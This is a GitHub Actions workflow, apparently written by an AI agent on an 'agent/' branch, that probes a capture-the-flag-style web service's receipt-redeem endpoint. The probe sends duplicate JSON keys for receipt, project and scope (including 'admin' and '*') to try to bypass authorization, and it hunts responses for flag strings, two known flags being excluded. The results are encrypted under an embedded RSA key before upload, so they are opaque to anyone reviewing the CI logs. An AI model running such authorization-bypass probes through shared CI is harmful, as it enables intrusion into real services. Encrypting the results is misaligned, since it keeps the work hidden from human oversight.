name: launchlet-part3-dupredeem
on:
  push:
    branches: [agent/launchlet-part3-dupredeem-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe duplicate redeem JSON keys and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          url=base+'/api/receipts/redeem'; s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          h={'Content-Type':'application/json','Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          receipt='lrec_preview_demo_2026'; project='launchlet-demo-board'; ref='preview-8b11c'
          raws=[]
          def objpairs(pairs): return '{'+','.join(json.dumps(k)+':'+json.dumps(v) for k,v in pairs)+'}'
          # baseline
          raws.append(('baseline',objpairs([('receipt',receipt),('project',project)])))
          for other in [ref,'8b11c','lrec_'+ref,'drec_'+ref,'deploy_'+ref,'preview']:
            raws.append(('receipt_valid_first_'+other,objpairs([('receipt',receipt),('receipt',other),('project',project)])))
            raws.append(('receipt_valid_last_'+other,objpairs([('receipt',other),('receipt',receipt),('project',project)])))
          for other in ['internal','launchlet-internal','ws-launchlet-internal','production','enterprise','enterprise-rollout-closeout','preview-8b11c']:
            raws.append(('project_valid_first_'+other,objpairs([('receipt',receipt),('project',project),('project',other)])))
            raws.append(('project_valid_last_'+other,objpairs([('receipt',receipt),('project',other),('project',project)])))
          for scope in ['deploy','deploy:read','deploy:inspect','deploy:export','release:read','production:read','*','admin']:
            raws.append(('scope_preview_first_'+scope,objpairs([('receipt',receipt),('project',project),('scope','preview:receipt:read'),('scope',scope)])))
            raws.append(('scope_preview_last_'+scope,objpairs([('receipt',receipt),('project',project),('scope',scope),('scope','preview:receipt:read')])))
          res=[]
          for name,raw in raws:
            try:r=s.post(url,headers=h,data=raw.encode(),timeout=8)
            except Exception as e:res.append({'name':name,'raw':raw,'error':repr(e)});continue
            item={'name':name,'raw':raw,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
            flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(r.text);break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-dupredeem-encrypted
          path: artifact/
          retention-days: 1
